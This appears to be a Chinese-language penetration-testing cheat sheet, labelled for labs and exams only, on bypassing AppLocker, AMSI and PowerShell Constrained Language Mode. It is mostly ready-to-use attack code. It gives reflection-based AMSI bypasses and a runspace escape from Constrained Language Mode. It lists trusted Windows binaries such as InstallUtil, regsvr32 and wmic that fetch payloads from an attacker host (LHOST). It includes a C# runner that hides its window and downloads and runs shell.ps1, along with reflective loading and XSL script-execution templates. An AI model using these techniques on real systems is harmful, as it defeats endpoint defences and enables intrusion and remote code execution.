# AppLocker 与 AMSI

::: warning 仅供学习 / 授权实验
下面的侦察命令、受信任宿主和公开 AMSI 手法用于 lab / 考试。网上的 bypass 会随补丁失效，先探针再换。
:::

## 落地侦察

```powershell
whoami /priv
whoami /groups
$ExecutionContext.SessionState.LanguageMode
[Environment]::Is64BitProcess
Get-ExecutionPolicy -List
Get-MpComputerStatus | Select-Object AMSI*, RealTimeProtectionEnabled, BehaviorMonitorEnabled
reg query "HKLM\Software\Microsoft\AMSI"
Get-Process -Id $PID | Select Path
Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
(Get-AppLockerPolicy -Effective).RuleCollections | Select CollectionType, EnforcementMode
Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Test-Path C:\Windows\Tasks
icacls C:\Windows\Tasks
```

无害对照：先投只 `printf("ok")` 的 exe。能保存能跑，你的文件落地即消失 → 静态；能启动跑到一半被杀 → 行为。

## AMSI 探针

```powershell
# 被拦说明 AMSI 在干活；没拦可能未启用或已被处理
try { [scriptblock]::Create('Invoke-Mimikatz') } catch { $_ }
```

## 公开的 PowerShell 处理（会过期）

经典反射（每个公开 OSEP cheatsheet 都有，补丁后常失效）：

```powershell
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
$f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
$f.SetValue($null, $true)
```

字符串拼接版：

```powershell
$t = [type]('System.Management.Automation.A'+'msiUtils')
$t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
```

WSH / `cscript` 不要套这段。失败就换宿主，不要堆 10 层混淆。

## CLM：新 Runspace

CLM 只绑当前 Runspace。能创建新 Runspace 时默认常是 FullLanguage：

```powershell
$rs = [runspacefactory]::CreateRunspace()
$rs.Open()
$ps = [powershell]::Create()
$ps.Runspace = $rs
[void]$ps.AddScript('whoami; $ExecutionContext.SessionState.LanguageMode')
$ps.Invoke()
$ps.Dispose(); $rs.Close()
```

若 AppLocker 连 powershell.exe 都拒，这段没用，改 InstallUtil。

## 受信任宿主

| 宿主 | 命令 |
|---|---|
| InstallUtil x64 | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U runner.exe` |
| InstallUtil x86 | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U runner.exe` |
| csc | 同上目录 `csc.exe /out:runner.exe runner.cs` |
| Workflow Compiler | `Microsoft.Workflow.Compiler.exe payload.xoml out.xml` |
| wmic + XSL | `wmic process list /format:"http://LHOST/x.xsl"` 或本地 xsl |
| mshta | 见 [HTA](/topics/hta) |
| regsvr32 | `regsvr32 /s /n /u /i:http://LHOST/file.sct scrobj.dll` |

InstallUtil 兼容类：

```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

[RunInstaller(true)]
public class Runner : Installer {
    public override void Install(System.Collections.IDictionary s) { Exec(); }
    public override void Uninstall(System.Collections.IDictionary s) { Exec(); }
    public static void Run() { Exec(); }   // 给 Assembly.Load 反射
    static void Exec() {
        string url = "http://LHOST/shell.ps1";
        Process.Start(new ProcessStartInfo("cmd.exe",
            "/c powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('" + url + "'))\"")
        { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
    }
}
```

```bat
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe runner.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U runner.exe
```

报「不是有效的 Win32 应用程序」→ 换 `Framework`（32 位）目录。

## 反射加载托管工具（EXE 不能直启）

```powershell
$bytes = [IO.File]::ReadAllBytes("C:\Windows\Temp\tool.dll")
$asm = [Reflection.Assembly]::Load($bytes)
$t = $asm.GetType("Tool.Program")
$t.GetMethod("Main").Invoke($null, @([string[]]@("arg1")))
```

原生 EXE 不能 `Assembly.Load`。

## XSL 概念

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://lab" version="1.0">
  <msxsl:script language="JScript" implements-prefix="user">
    function run() {
      var s = new ActiveXObject("WScript.Shell");
      s.Run("calc.exe");
      return 0;
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:run()"/>
  </xsl:template>
</xsl:stylesheet>
```

实验室把 `calc.exe` 换成你的实验命令。`wmic os get /format:file.xsl`。
